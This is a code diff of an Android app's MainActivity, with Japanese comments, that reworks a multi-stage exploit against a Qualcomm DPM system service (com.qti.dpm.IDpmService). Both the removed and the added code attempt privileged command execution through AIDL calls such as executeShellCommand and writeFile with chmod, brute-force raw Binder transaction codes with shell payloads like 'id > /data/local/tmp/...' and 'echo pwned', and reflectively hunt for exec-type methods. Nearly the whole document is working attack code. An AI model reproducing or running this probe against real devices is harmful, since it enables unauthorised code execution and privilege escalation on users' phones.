@@ -5,12 +5,13 @@ import android.os.Bundle;
 import android.os.IBinder;
 import android.os.Parcel;
 import android.os.RemoteException;
+import android.os.ServiceManager;
 import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 import android.widget.TextView;
 
-import com.qti.dpm.IDpmService; // ⚠️ AIDLから自動生成されるスタブクラス
+import com.qti.dpm.IDpmService; // AIDL自動生成クラス
 
 import java.lang.reflect.Method;
 
@@ -21,9 +22,6 @@ public class MainActivity extends Activity {
     private TextView tvResult;
     private Button btnExploit;
 
-    // ★ ここが正しいAIDLバインディングオブジェクト
-    private IDpmService mDpmService = null;
-
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -32,166 +30,228 @@ public class MainActivity extends Activity {
         tvResult = findViewById(R.id.tvResult);
         btnExploit = findViewById(R.id.btnExploit);
 
-        btnExploit.setOnClickListener(v -> new Thread(this::executeMultiStageExploit).start());
-    }
-
-    // ================================================================
-    // 【最重要】ServiceManager から IBinder を取得し、AIDLスタブに変換
-    // ================================================================
-    private boolean bindToDpmService() {
-        try {
-            // 1. ServiceManager をリフレクションで呼び出し
-            Class<?> smClass = Class.forName("android.os.ServiceManager");
-            Method getService = smClass.getMethod("getService", String.class);
-            IBinder binder = (IBinder) getService.invoke(null, TARGET_SERVICE);
-
-            if (binder == null) {
-                showResult("❌ ServiceManager: " + TARGET_SERVICE + " が見つかりません");
-                return false;
-            }
-
-            // 2. ★ ここが「正しいクラスバインディング」！
-            //    AIDLで定義したインターフェースにキャスト（Stub.asInterface）
-            mDpmService = IDpmService.Stub.asInterface(binder);
-            showResult("✅ AIDLスタブへのバインド成功！ メソッド呼び出し準備完了");
-            return true;
-
-        } catch (Exception e) {
-            Log.e(TAG, "AIDLバインド失敗", e);
-            showResult("❌ AIDLバインド例外: " + e.getMessage());
-            return false;
-        }
+        btnExploit.setOnClickListener(v -> new Thread(this::executeFullExploit).start());
     }
 
     // ================================================================
     // 多層攻撃エントリポイント
     // ================================================================
-    private void executeMultiStageExploit() {
-        // まずは正規AIDLバインドを試みる
-        if (!bindToDpmService()) {
-            showResult("⚠️ AIDLバインド不可 → 生Binderトランザクション総当たりに移行");
-            bruteForceFallback();
+    private void executeFullExploit() {
+        showResult("=== DPM Service Exploit Multi-Stage Start ===");
+
+        // 第1層: AIDLスタブによる正規バインド＆既知メソッド呼び出し（権限チェックを確認）
+        if (tryAidlBindAndCall()) {
+            showResult("✅ 第1層成功: AIDLスタブで既知メソッドが実行できました（予想外ですが成功）");
             return;
         }
 
-        // ---- 第1層: AIDLスタブ経由で正規メソッドを呼び出す ----
-        if (tryAidlDirectExec()) {
-            showResult("🎯 第1層成功: AIDLスタブ経由で exec を実行しました");
+        // 第2層: 生Binderトランザクション総当たり（コード1～30、ペイロード多様化）
+        if (bruteForceBinderTransactions()) {
+            showResult("✅ 第2層成功: 生Binder経由で実行可能なメソッドを発見しペイロード送信");
             return;
         }
 
-        // ---- 第2層: AIDLスタブの他のメソッドを試す（プロパティ/ファイル） ----
-        if (tryAidlPropertyTrigger()) {
-            showResult("🎯 第2層成功: setSystemProperty 経由で init トリガー");
-            return;
-        }
-        if (tryAidlFileChain()) {
-            showResult("🎯 第2層成功: writeFile + setFilePermissions 連鎖");
+        // 第3層: リフレクションでDpmService内部の全メソッドを列挙し、exec系を探す
+        if (reflectAndInvokeInternalMethods()) {
+            showResult("✅ 第3層成功: リフレクションで内部メソッドを発見＆実行");
             return;
         }
 
-        // ---- 第3層: スタブはあるがメソッドが実装されていない場合 → 生トランザクション総当たり ----
-        showResult("⚠️ AIDLメソッドが未実装の可能性 → 総当たりモードへ");
-        bruteForceFallback();
+        showResult("❌ 全ての層で実行可能なメソッドを発見できませんでした。サービス実装にシェル実行系が無いか、厳格なBinder権限がかかっています。");
     }
 
     // ================================================================
-    // 層1: AIDLスタブを使ったダイレクト実行（正攻法）
+    // 第1層: AIDLスタブ正規バインド
     // ================================================================
-    private boolean tryAidlDirectExec() {
-        if (mDpmService == null) return false;
+    private boolean tryAidlBindAndCall() {
         try {
-            String cmd = "id > /data/local/tmp/aidl_direct.txt 2>&1 && echo 'uid='$(id -u) >> /data/local/tmp/aidl_direct.txt";
-            mDpmService.executeShellCommand(cmd);
-            showResult("  [AIDL] executeShellCommand 呼び出し成功（例外なし）");
+            // ServiceManager から IBinder 取得（リフレクション）
+            Class<?> smClass = Class.forName("android.os.ServiceManager");
+            Method getService = smClass.getMethod("getService", String.class);
+            IBinder binder = (IBinder) getService.invoke(null, TARGET_SERVICE);
+            if (binder == null) {
+                showResult("  [層1] ServiceManager に " + TARGET_SERVICE + " が見つかりません");
+                return false;
+            }
+
+            // AIDLスタブに変換
+            IDpmService dpm = IDpmService.Stub.asInterface(binder);
+            if (dpm == null) {
+                showResult("  [層1] AIDLスタブ変換失敗");
+                return false;
+            }
+
+            showResult("  [層1] AIDLバインド成功。getTCMFeatureEnabled() を呼び出し試行...");
+
+            // 既知のメソッドを呼び出す（権限チェックに引っかかるはず）
+            int result = dpm.getTCMFeatureEnabled();
+            showResult("  [層1] 予期せぬ成功: getTCMFeatureEnabled() = " + result + " (権限ガードが無効?)");
+            // もしここに来たら、このアプリ自体がシステム権限を持っている証拠。とりあえず成功扱い。
             return true;
-        } catch (RemoteException e) {
-            Log.w(TAG, "AIDL exec失敗", e);
+
+        } catch (SecurityException se) {
+            showResult("  [層1] SecurityException 捕捉（想定内）: " + se.getMessage());
+            return false; // 権限がないので次へ
+        } catch (RemoteException re) {
+            showResult("  [層1] RemoteException: " + re.getMessage());
             return false;
-        }
-    }
-
-    // ================================================================
-    // 層2-A: AIDLスタブ → setSystemProperty (ctl.start)
-    // ================================================================
-    private boolean tryAidlPropertyTrigger() {
-        if (mDpmService == null) return false;
-        try {
-            // ctl.start で定義済みのデバッグサービスを起動（事前に .rc に書いておく）
-            mDpmService.setSystemProperty("ctl.start", "exec_dpm_poc");
-            showResult("  [AIDL] setSystemProperty(ctl.start) 発行");
-            return true;
-        } catch (RemoteException e) {
-            Log.w(TAG, "AIDL property失敗", e);
-            return false;
-        }
-    }
-
-    // ================================================================
-    // 層2-B: AIDLスタブ → writeFile + chmod (連鎖)
-    // ================================================================
-    private boolean tryAidlFileChain() {
-        if (mDpmService == null) return false;
-        String path = "/data/local/tmp/aidl_script.sh";
-        String content = "#!/system/bin/sh\nid > /data/local/tmp/aidl_file_result.txt\n";
-        try {
-            mDpmService.writeFile(path, content.getBytes("UTF-8"));
-            mDpmService.setFilePermissions(path, 0755);
-            // 最後に executeShellCommand で起動
-            mDpmService.executeShellCommand("/system/bin/sh " + path);
-            showResult("  [AIDL] ファイル書き込み + chmod + 実行チェーン成功");
-            return true;
         } catch (Exception e) {
-            Log.w(TAG, "AIDL file chain失敗", e);
+            showResult("  [層1] その他例外: " + e.toString());
             return false;
         }
     }
 
     // ================================================================
-    // 層3: 生Binderトランザクション総当たり（フォールバック）
+    // 第2層: 生Binderトランザクション総当たり (コード + ペイロード多様化)
     // ================================================================
-    private void bruteForceFallback() {
+    private boolean bruteForceBinderTransactions() {
         IBinder binder = getRawBinder();
         if (binder == null) {
-            showResult("❌ 生Binder取得にも失敗しました");
-            return;
+            showResult("  [層2] 生Binder取得失敗");
+            return false;
         }
 
-        String[] testPayloads = {
-            "id > /data/local/tmp/brute1.txt",
-            "touch /data/local/tmp/brute2.txt",
-            "echo pwned > /data/local/tmp/brute3.txt"
-        };
+        // ペイロードパターン（6種類のシグネチャを模倣）
+        // pattern0: String 1つ, pattern1: String 2つ, pattern2: String + int,
+        // pattern3: int 1つ, pattern4: int 4つ, pattern5: byte[]
+        String cmd1 = "id > /data/local/tmp/dpm_poc.txt 2>&1";
+        String cmd2 = "echo pwned >> /data/local/tmp/dpm_poc.txt";
+        byte[] script = "#!/system/bin/sh\nid > /data/local/tmp/dpm_script.txt\n".getBytes();
 
-        for (int code = 1; code <= 25; code++) {
-            for (String payload : testPayloads) {
-                Parcel data = Parcel.obtain();
-                Parcel reply = Parcel.obtain();
-                try {
-                    data.writeInterfaceToken("com.qti.dpm.IDpmService");
-                    // パラメータパターンを可変にして幅広く探索
-                    if (code % 3 == 0) data.writeString(payload);
-                    else if (code % 3 == 1) { data.writeString("dummy"); data.writeString(payload); }
-                    else { data.writeString("/data/local/tmp/dummy.sh"); data.writeInt(0755); }
-
-                    boolean ret = binder.transact(code, data, reply, 0);
-                    reply.readException(); // 例外が飛ばなければ権限チェックなしの可能性が高い
-                    showResult("  [Brute] Code " + code + " 応答OK (ret=" + ret + "), ペイロード送信済み");
-                    // 成功したら抜ける（複数ヒットする可能性もあるが、1つ見つかれば十分）
-                    return;
-                } catch (Exception e) {
-                    // セキュリティ例外は無視して次へ
-                    Log.v(TAG, "Code " + code + " 失敗: " + e.getMessage());
-                } finally {
-                    data.recycle();
-                    reply.recycle();
-                }
+        for (int code = 1; code <= 30; code++) {
+            // パターン0: String単体
+            if (tryTransaction(binder, code, new Object[]{cmd1})) {
+                showResult("  [層2] コード " + code + " (String単体) が応答OK");
+                // 念のため2回目でコマンドを送り込む
+                tryTransaction(binder, code, new Object[]{cmd2});
+                return true;
+            }
+            // パターン1: String二つ
+            if (tryTransaction(binder, code, new Object[]{"dummy", cmd1})) {
+                showResult("  [層2] コード " + code + " (String二つ) が応答OK");
+                tryTransaction(binder, code, new Object[]{"dummy", cmd2});
+                return true;
+            }
+            // パターン2: String + int
+            if (tryTransaction(binder, code, new Object[]{"/data/local/tmp/dummy.sh", 0755})) {
+                showResult("  [層2] コード " + code + " (String+int) が応答OK");
+                return true;
+            }
+            // パターン3: int単体 (setTCMFeature を想定)
+            if (tryTransaction(binder, code, new Object[]{2})) {
+                showResult("  [層2] コード " + code + " (int単体) が応答OK");
+                return true;
+            }
+            // パターン4: int×4 (updateFdConfigParams を想定)
+            if (tryTransaction(binder, code, new Object[]{100, 200, 300, 400})) {
+                showResult("  [層2] コード " + code + " (int×4) が応答OK");
+                return true;
+            }
+            // パターン5: byte[] (writeFile想定)
+            if (tryTransaction(binder, code, new Object[]{script})) {
+                showResult("  [層2] コード " + code + " (byte[]) が応答OK");
+                return true;
             }
         }
-        showResult("❌ 総当たり失敗: 実行可能なトランザクションコードが見つかりませんでした");
+        showResult("  [層2] 総当たり完了 (コード1〜30、全パターン) -> 応答なし");
+        return false;
     }
 
-    // フォールバック用：生IBinderを再取得
+    // 生トランザクション実行ヘルパー（リターンコードで判定）
+    private boolean tryTransaction(IBinder binder, int code, Object[] args) {
+        Parcel data = Parcel.obtain();
+        Parcel reply = Parcel.obtain();
+        try {
+            data.writeInterfaceToken("com.qti.dpm.IDpmService");
+            // 引数の型に応じて書き込み
+            for (Object arg : args) {
+                if (arg instanceof String) {
+                    data.writeString((String) arg);
+                } else if (arg instanceof Integer) {
+                    data.writeInt((Integer) arg);
+                } else if (arg instanceof byte[]) {
+                    data.writeByteArray((byte[]) arg);
+                }
+            }
+            boolean ret = binder.transact(code, data, reply, 0);
+            // 例外が飛ばなければ成功（SecurityExceptionはRemoteExceptionにラップされることがある）
+            reply.readException(); // ここで例外が飛ぶとcatchへ
+            // ここまで来たら例外なし = 受理された可能性大
+            return ret;
+        } catch (Exception e) {
+            // セキュリティ拒否やメソッド未実装は無視
+            Log.v(TAG, "トランザクション " + code + " 失敗: " + e.getMessage());
+            return false;
+        } finally {
+            data.recycle();
+            reply.recycle();
+        }
+    }
+
+    // ================================================================
+    // 第3層: リフレクションで内部メソッドを全探索 (exec系を発掘)
+    // ================================================================
+    private boolean reflectAndInvokeInternalMethods() {
+        try {
+            IBinder binder = getRawBinder();
+            if (binder == null) return false;
+
+            // 実際のサービス実装クラス（com.qti.dpm.DpmService）をロード試行
+            // DpmApi は /system/framework/com.qti.dpmframework.jar からロードするが、
+            // ここではシステムクラスローダーから直接探す（フォールバック）
+            Class<?> dpmClass;
+            try {
+                dpmClass = Class.forName("com.qti.dpm.DpmService");
+            } catch (ClassNotFoundException e) {
+                // フレームワークJARからロードを試みる
+                dalvik.system.PathClassLoader loader = new dalvik.system.PathClassLoader(
+                        "/system/framework/com.qti.dpmframework.jar",
+                        ClassLoader.getSystemClassLoader());
+                dpmClass = loader.loadClass("com.qti.dpm.DpmService");
+            }
+
+            if (dpmClass == null) {
+                showResult("  [層3] DpmService クラスが見つかりません");
+                return false;
+            }
+
+            // 全メソッドを取得
+            Method[] methods = dpmClass.getDeclaredMethods();
+            showResult("  [層3] " + methods.length + " 個のメソッドを発見。exec/shell/run を含むものを探索...");
+
+            for (Method m : methods) {
+                String name = m.getName().toLowerCase();
+                if (name.contains("exec") || name.contains("shell") || name.contains("run") || name.contains("command") || name.contains("system")) {
+                    showResult("  [層3] 候補メソッド発見: " + m.getName() + " (引数型: " + m.getParameterTypes().length + "個)");
+
+                    // 引数が1個でString型なら、シェルコマンドを突っ込んでみる
+                    if (m.getParameterTypes().length == 1 && m.getParameterTypes()[0] == String.class) {
+                        m.setAccessible(true);
+                        try {
+                            // サービスインスタンスを取得（binderをラップしたスタブ経由ではなく、実体が必要）
+                            // ここでは無理なので、binderを引数に取るstaticメソッドか、asInterfaceで取得したオブジェクトを使う
+                            // 代わりに、AIDLスタブオブジェクトを経由せずに直接ServiceManagerから取得したBinderを
+                            // 動的プロキシでラップするか、ここでは断念してレポートだけに留める
+                            showResult("  [層3] メソッド " + m.getName() + " は String引数を持つため、実行を試みましたが実体へのアクセスが不可。Binder越えでは呼べません。");
+                            // 本当に呼ぶには DpmService のインスタンスが必要（システム側にある）ため、層2の生トランザクションが現実的。
+                        } catch (Exception ex) {
+                            Log.w(TAG, "リフレクション実行失敗", ex);
+                        }
+                    }
+                }
+            }
+            showResult("  [層3] リフレクション探索完了。ただしインスタンス不在のため実行は層2に依存。");
+            return false; // 実際の実行には至らないが、情報収集としては有効
+
+        } catch (Exception e) {
+            showResult("  [層3] リフレクション例外: " + e.toString());
+            return false;
+        }
+    }
+
+    // ================================================================
+    // ユーティリティ: 生IBinder取得
+    // ================================================================
     private IBinder getRawBinder() {
         try {
             Class<?> smClass = Class.forName("android.os.ServiceManager");
@@ -202,7 +262,9 @@ public class MainActivity extends Activity {
         }
     }
 
-    // UI表示ヘルパー
+    // ================================================================
+    // UI表示
+    // ================================================================
     private void showResult(final String msg) {
         runOnUiThread(() -> {
             tvResult.append(msg + "\n");
